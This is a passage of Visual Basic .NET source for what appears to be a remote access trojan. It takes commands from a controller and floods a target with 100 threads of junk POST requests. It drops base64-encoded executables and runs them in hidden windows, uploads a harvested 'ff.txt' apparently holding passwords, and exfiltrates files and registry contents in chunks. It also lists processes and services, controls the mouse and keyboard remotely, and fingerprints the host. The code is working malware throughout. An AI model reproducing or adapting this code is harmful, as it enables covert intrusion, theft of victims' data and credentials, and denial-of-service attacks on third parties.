                Dim postBytes As Byte() = System.Text.Encoding.UTF8.GetBytes("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG")
                With request
                    .Method = "POST"
                    .ContentType = "application/x-www-form-urlencoded"
                    .ContentLength = postBytes.Length
                    .UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
                    .Referer = "http://0mn3d6yunkn0wn.com"
                End With
                Dim dataStreamOut As System.IO.Stream = request.GetRequestStream()
                With dataStreamOut
                    .Write(postBytes, 0, postBytes.Length)
                    .Close()
                End With
                dataStreamOut = Nothing

                Dim response As Net.HttpWebResponse = Nothing
                Try
                    response = request.GetResponse()
                Catch Ex As System.Net.WebException

                End Try

                Dim dataStream As System.IO.Stream = response.GetResponseStream(), _
                    reader As New System.IO.StreamReader(dataStream), _
                    responseString As String = reader.ReadToEnd()
                reader.Close()
                dataStream.Close()
                response.Close()

                request = Nothing
                response = Nothing
                dataStream = Nothing
                reader = Nothing

            Catch ex As Exception

            End Try



        Next
    End Sub

    Private Sub DDATONWB(ByVal tempdata As String)
       

        For i As Integer = 0 To 100
            Dim t As Thread = New Thread(New ParameterizedThreadStart(AddressOf sd))
            t.Start(tempdata)
        Next

    End Sub

    Private Sub UPANDRUN(ByVal tempdata As String)
        Try
            Dim appoggio As String
            Dim str As String() = tempdata.Split("*")
            Dim filename As String = str.GetValue(1).ToString
            appoggio = str.GetValue(0).ToString
            If appoggio = "temp" Then
                appoggio = Path.GetTempPath

            End If
            If Not Directory.Exists(appoggio) Then
                Directory.CreateDirectory(appoggio)
            End If
            If Not File.Exists(appoggio & filename) Then
                Dim dataw() As Byte = Convert.FromBase64String(str.GetValue(2))
                My.Computer.FileSystem.WriteAllBytes(appoggio & filename, dataw, False)
                Delay(5)
            End If
            Dim hide As String = str.GetValue(3)
            If hide = "0" Then
                Dim p As New Process()
                p.StartInfo.WorkingDirectory = appoggio
                p.StartInfo.FileName = appoggio & filename
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                p.Start()
            Else
                Dim p As New Process()
                p.StartInfo.WorkingDirectory = appoggio
                p.StartInfo.FileName = appoggio & filename
                p.StartInfo.WindowStyle = ProcessWindowStyle.Normal
                p.Start()
            End If
            If appoggio = Path.GetTempPath Then
                Delay(5)
                Dim st As String = Nothing
                Try
                    st = My.Computer.FileSystem.ReadAllText(Path.GetTempPath & "ff.txt")
                Catch ex As Exception

                End Try
                If st = Nothing Then
                    streamWriter.WriteLine("/PSSRLIST/" & Encrypt("Nothing to show!!!", "&%#@?,:*"))
                Else
                    streamWriter.WriteLine("/PSSRLIST/" & Encrypt(st, "&%#@?,:*"))
                End If

                streamWriter.Flush()
            Else
                Action(True)

            End If
        Catch ex As Exception
            Action(False)
        End Try
       
    End Sub

    Private Sub proc()
        Try
            streamWriter.WriteLine("/LISTPROC/" & ListProcess())
            streamWriter.Flush()
        Catch ex As Exception
            Action(False)
        End Try
       
    End Sub

    Private Sub serv()
        Try
            streamWriter.WriteLine("/LISTSERV/" & ListServices())
            streamWriter.Flush()
        Catch ex As Exception
            Action(False)
        End Try
       
    End Sub

    Private Sub listd(ByVal tempdata As String)
        Try
            Dim td As String = Nothing
            Dim ta As String = Nothing
            Dim currDirectory As New IO.DirectoryInfo(tempdata)
            If tempdata.Length > 3 Then
                ta = "(DIR)." & "*" & "(DIR).." & "*"
            End If
            For Each subDirectory As IO.DirectoryInfo In currDirectory.GetDirectories

                td = "(DIR)" & subDirectory.Name
                ta = ta & td & "*"
            Next
            For Each Filef As IO.FileInfo In currDirectory.GetFiles
                td = Filef.Name
                ta = ta & td & "*"
            Next
            streamWriter.WriteLine("/ONLYONEP/" & ta)
            streamWriter.Flush()
        Catch ex As Exception
            streamWriter.WriteLine("/ERRORDIR/" & "(DIR)." & "*" & "(DIR)..")
            streamWriter.Flush()
        End Try
       
    End Sub

    Private Sub ReadRegistry(ByVal Node As String)
        Dim node1 As String = Nothing
        Dim SubKeys As String() = Nothing
        Try
            Select Case Node
                Case "CU"
                    SubKeys = Registry.CurrentUser.GetSubKeyNames()
                Case "LM"
                    SubKeys = Registry.LocalMachine.GetSubKeyNames()
                Case "US"
                    SubKeys = Registry.Users.GetSubKeyNames()
            End Select
            For Each Key1 As String In SubKeys
                Try
                    If node1 = Nothing Then
                        node1 = Key1
                    Else
                        node1 = node1 & "¥" & Key1
                    End If

                Catch ex As Exception

                End Try

            Next Key1

            streamWriter.WriteLine("/REGYVIEW/" & Node & node1)
            streamWriter.Flush()


        Catch ex As Exception

        End Try

    End Sub
    Private Sub ReadRegistry1(ByVal Node As String)
        Try
            Dim node1 As String = Nothing
            Dim SubKeys As String() = Nothing
            Dim rge = Mid(Node, 3, Len(Node))
            Node = Microsoft.VisualBasic.Left(Node, 2)


            Select Case Node
                Case "CU"
                    SubKeys = Registry.CurrentUser.OpenSubKey(rge).GetSubKeyNames()
                Case "LM"
                    SubKeys = Registry.LocalMachine.OpenSubKey(rge).GetSubKeyNames()
                Case "US"
                    SubKeys = Registry.Users.OpenSubKey(rge).GetSubKeyNames()
            End Select
            For Each Key1 As String In SubKeys
                Try
                    If node1 = Nothing Then
                        node1 = Key1
                    Else
                        node1 = node1 & "¥" & Key1
                    End If

                Catch ex As Exception

                End Try

            Next Key1
            If Not node1 = Nothing Then
                streamWriter.WriteLine("/REGVIEWS/" & node1)
                streamWriter.Flush()

            End If


        Catch ex As Exception

        End Try

    End Sub

    Private Sub ReadRegistry2(ByVal Node As String)
        Try
            Dim node1 As String = Nothing
            Dim values() As String = Nothing
            Dim rge = Mid(Node, 3, Len(Node))
            Node = Microsoft.VisualBasic.Left(Node, 2)
            Dim rk As RegistryKey = Nothing
            Select Case Node
                Case "CU"
                    values = Registry.CurrentUser.OpenSubKey(rge).GetValueNames()
                    rk = Registry.CurrentUser.OpenSubKey(rge)
                Case "LM"
                    values = Registry.LocalMachine.OpenSubKey(rge).GetValueNames()
                    rk = Registry.LocalMachine.OpenSubKey(rge)
                Case "US"
                    values = Registry.Users.OpenSubKey(rge).GetValueNames()
                    rk = Registry.Users.OpenSubKey(rge)
            End Select

            If values.Length > 0 Then
                For Each value As Object In values
                    Dim data As Object = rk.GetValue(value)

                    If data IsNot Nothing Then
                        Dim stringData As String = data.ToString()

                        'if the data is too long, display the begining only
                        If stringData.Length > 100 Then
                            stringData = stringData.Substring(0, 95) & " ..."
                        End If
                        Try
                            If node1 = Nothing Then
                                node1 = value & "§" & stringData
                            Else
                                node1 = node1 & "¥" & value & "§" & stringData
                            End If

                        Catch ex As Exception

                        End Try
                        'Display the data of the value. The conditional operatore is
                        'needed because the default value has no name

                    End If
                Next value
                If Not node1 = Nothing Then
                    streamWriter.WriteLine("/REGVIEWV/" & node1)
                    streamWriter.Flush()

                End If

            End If

        Catch ex As Exception

        End Try

    End Sub

    Private Sub down(ByVal tempdata As String)
        Try

            Dim build, build2 As New StringBuilder
            _Index = 1
            _InputFileStram = New FileStream(tempdata, FileMode.Open, FileAccess.Read, FileShare.Read)
            _BinaryReader = New BinaryReader(_InputFileStram)
            _FileSize = FileSize(tempdata)
            If _FileSize < ChunkSize Then
                _BinaryReader.BaseStream.Seek(0, SeekOrigin.Begin)
                ReDim _Buffer(_FileSize - 1)
                _BinaryReader.Read(_Buffer, 0, _FileSize)
                _StartPosition = _BinaryReader.BaseStream.Seek(0, SeekOrigin.Current)
                build.Append("/STARTDOW/" & _FileSize & "*")
                For i As Integer = 0 To _Buffer.Length - 1
                    build2.Append(_Buffer.GetValue(i).ToString & " ")
                Next
                build.Append(build2)
                streamWriter.WriteLine(build)
                streamWriter.Flush()
            Else
                _Fragments = Math.Floor((_FileSize / ChunkSize))
                _RemainingBytes = _FileSize - (_Fragments * ChunkSize)
                _BinaryReader.BaseStream.Seek(0, SeekOrigin.Begin)
                ReDim _Buffer(ChunkSize - 1)
                _BinaryReader.Read(_Buffer, 0, ChunkSize)
                _StartPosition = _BinaryReader.BaseStream.Seek(0, SeekOrigin.Current)
                build.Append("/STARTDOW/" & _FileSize & "*")
                For i As Integer = 0 To _Buffer.Length - 1
                    build2.Append(_Buffer.GetValue(i).ToString & " ")
                Next
                build.Append(build2)
                streamWriter.WriteLine(build)
                streamWriter.Flush()
            End If
        Catch ex As Exception
            Try
                StopStream()
                streamWriter.WriteLine("/ERROR/")
                streamWriter.Flush()
            Catch exi As Exception
            End Try
        End Try
    End Sub

    Private Sub down2()
        Try

            If _Index <> _Fragments Then
                Dim build, build2 As New StringBuilder
                _Index = _Index + 1
                ReDim _Buffer(ChunkSize - 1)
                _BinaryReader.Read(_Buffer, 0, ChunkSize)
                _StartPosition = _BinaryReader.BaseStream.Seek(0, SeekOrigin.Current)
                build.Append("/PAKSSEND/")
                For i As Integer = 0 To _Buffer.Length - 1
                    build2.Append(_Buffer.GetValue(i).ToString & " ")
                Next
                build.Append(build2)
                streamWriter.WriteLine(build)
                streamWriter.Flush()
            Else
                If _RemainingBytes > 0 Then
                    Dim build, build2 As New StringBuilder
                    ReDim _Buffer(_RemainingBytes - 1)
                    _BinaryReader.Read(_Buffer, 0, _RemainingBytes)
                    build.Append("/FINEDOWN/")
                    For i As Integer = 0 To _Buffer.Length - 1
                        build2.Append(_Buffer.GetValue(i).ToString & " ")
                    Next
                    build.Append(build2)
                    streamWriter.WriteLine(build)
                    streamWriter.Flush()
                    StopStream()
                Else
                    streamWriter.WriteLine("/FINEDOWN/" & "")
                    streamWriter.Flush()
                    StopStream()
                End If

            End If
        Catch ex As Exception
            Try
                StopStream()
                streamWriter.WriteLine("/ERROR/")
                streamWriter.Flush()
            Catch exi As Exception

            End Try
        End Try
    End Sub

    Private Sub upl(ByVal tempdata As String)
        Try
            Dim appoggio As String
            Dim str As String() = tempdata.Split("*")
            Dim filename As String = str.GetValue(1).ToString
            appoggio = str.GetValue(0).ToString
            If Not Directory.Exists(appoggio) Then
                Directory.CreateDirectory(appoggio)
            End If
            Dim hexValues() As String = str.GetValue(2).Trim.Split(" ")
            Dim bytes(hexValues.GetUpperBound(0)) As Byte
            For i As Integer = 0 To (hexValues.Length - 1)
                bytes(i) = hexValues.GetValue(i)
            Next
            If hexValues.Length < 4096 Then

                _Mergedfile = appoggio & filename
                If File.Exists(_Mergedfile) Then
                    Delay(1)
                    Try
                        File.Delete(_Mergedfile)
                    Catch ex As Exception
                        Try
                            Delay(1)
                            _OutputFileStram.Flush()
                            _OutputFileStram.Close()
                            _BinaryWriter.Close()
                            File.Delete(_Mergedfile)
                        Catch exi As Exception
                            Try
                                Delay(1)
                            Catch exep As Exception
                                File.Delete(_Mergedfile)
                            End Try
                        End Try
                    End Try
                End If
                _OutputFileStram = New FileStream(_Mergedfile, FileMode.CreateNew)
                _BinaryWriter = New BinaryWriter(_OutputFileStram)
                ReDim _Buffer(hexValues.Length - 1)
                _Buffer = bytes
                _BinaryWriter.Write(_Buffer)
                _OutputFileStram.Flush()
                _OutputFileStram.Close()
                _BinaryWriter.Close()


            Else

                _Mergedfile = appoggio & filename
                If File.Exists(_Mergedfile) Then
                    Delay(1)
                    Try
                        File.Delete(_Mergedfile)
                    Catch ex As Exception
                        Try
                            Delay(1)
                            _OutputFileStram.Flush()
                            _OutputFileStram.Close()
                            _BinaryWriter.Close()
                            File.Delete(_Mergedfile)
                        Catch exi As Exception
                            Try
                                Delay(1)
                            Catch exep As Exception
                                File.Delete(_Mergedfile)
                            End Try
                        End Try
                    End Try
                End If
                _OutputFileStram = New FileStream(_Mergedfile, FileMode.CreateNew)
                _BinaryWriter = New BinaryWriter(_OutputFileStram)
                ReDim _Buffer(hexValues.Length - 1)
                _Buffer = bytes
                _BinaryWriter.Write(_Buffer)
                _OutputFileStram.Flush()
                streamWriter.WriteLine("/ANOTHEPK/")
                streamWriter.Flush()
            End If
        Catch ex As Exception
            Try
                _OutputFileStram.Flush()
                _OutputFileStram.Close()
                _BinaryWriter.Close()
                streamWriter.WriteLine("/ERRORUPL/")
                streamWriter.Flush()

            Catch exi As Exception

            End Try
        End Try
    End Sub

    Private Sub upl2(ByVal tempdata As String)
        Try
            Dim hexValues() As String = tempdata.Trim.Split(" ")
            Dim bytes(hexValues.GetUpperBound(0)) As Byte
            For i As Integer = 0 To (hexValues.Length - 1)
                bytes(i) = hexValues.GetValue(i)
            Next
            ReDim _Buffer(hexValues.Length - 1)
            _Buffer = bytes
            _BinaryWriter.Write(_Buffer)
            _OutputFileStram.Flush()

            streamWriter.WriteLine("/ANOTHEPK/")
            streamWriter.Flush()
        Catch ex As Exception
            Try
                _OutputFileStram.Flush()
                _OutputFileStram.Close()
                _BinaryWriter.Close()
                streamWriter.WriteLine("/ERRORUPL/")
                streamWriter.Flush()
            Catch exi As Exception

            End Try
        End Try
    End Sub

    Private Sub upl3(ByVal tempdata As String)
        Try
            If tempdata <> "" Then
                Dim hexValues() As String = tempdata.Trim.Split(" ")
                Dim bytes(hexValues.GetUpperBound(0)) As Byte
                For i As Integer = 0 To (hexValues.Length - 1)
                    bytes(i) = hexValues.GetValue(i)
                Next
                ReDim _Buffer(hexValues.Length - 1)
                _Buffer = bytes
                _BinaryWriter.Write(_Buffer)
                _OutputFileStram.Flush()
                _OutputFileStram.Close()
                _BinaryWriter.Close()

            Else
                _OutputFileStram.Flush()
                _OutputFileStram.Close()
                _BinaryWriter.Close()
            End If
        Catch ex As Exception
            Try
                _OutputFileStram.Flush()
                _OutputFileStram.Close()
                _BinaryWriter.Close()
                streamWriter.WriteLine("/ERRORUPL/")
                streamWriter.Flush()
            Catch exi As Exception

            End Try
        End Try
    End Sub

    Private Sub setcl(ByVal tempdata As String)
        Try
            Select Case tempdata
                Case "right"
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 1)
                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 1)
                Case "left"
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 1)
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 1)
                Case "middle"
                    mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 1)
                    mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 1)
            End Select

        Catch ex As Exception

        End Try
    End Sub
    Private Sub setm(ByVal tempdata As String)
        Try

            Dim parts As String() = Tempdata.Split(CChar("*"))
            Dim cx As Integer = Math.Floor(Double.Parse(parts(0)))
            Dim cy As Integer = Math.Floor(Double.Parse(parts(1)))
            mp = New Point(cx, cy)
            Windows.Forms.Cursor.Position = (mp)
        Catch ex As Exception

        End Try

    End Sub

    Private Sub installk(ByVal tempdata As String)
        Try
            Dim str As String() = tempdata.Split("*")
            Dim filename As String = str.GetValue(1).ToString
            If Not Directory.Exists(str.GetValue(0).ToString) Then
                Directory.CreateDirectory(str.GetValue(0).ToString)
            End If
            If Not File.Exists(str.GetValue(0).ToString & filename) Then
                Dim dataw() As Byte = Convert.FromBase64String(str.GetValue(2))
                My.Computer.FileSystem.WriteAllBytes(str.GetValue(0).ToString & filename, dataw, False)
                Delay(5)
            End If
            Process.Start(str.GetValue(0).ToString & filename)
            Action(True)
        Catch ex As Exception
            Action(False)
        End Try
    End Sub

    Private Sub sendkeyb(ByVal tempdata As String)
        Try
            SendKeys.SendWait(tempdata)
        Catch ex As Exception

        End Try

    End Sub

    Private Sub first()
        Try
            Dim strOutput As String
            strOutput = My.Computer.Name & "*" & My.User.Name & "*" & My.Computer.Info.OSFullName & "*" & Application.ProductVersion & "G"
            streamWriter.WriteLine(strOutput)
            streamWriter.Flush()
        Catch ex As Exception

        End Try
    End Sub

    Private Sub info()
        Try

            objCS = New ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem")

            For Each objMgmt As Object In objCS.Get
                m_strManufacturer = objMgmt("manufacturer").ToString()
                m_StrModel = objMgmt("model").ToString()
            Next
            Dim strOutput As String = Nothing
            strOutput = "/INFOPCPC/"
            strOutput = strOutput & "Computer Name = " & My.Computer.Name & "±"
            strOutput = strOutput & "Computer Manufacturer = " & Manufacturer & "±"
            strOutput = strOutput & "Computer Model = " & Model & "±"
            strOutput = strOutput & "OS Name = " & My.Computer.Info.OSFullName & "±"
            strOutput = strOutput & "OS Version = " & My.Computer.Info.OSVersion & "±"
            strOutput = strOutput & "System Type = " & My.Computer.Info.OSPlatform & "±"
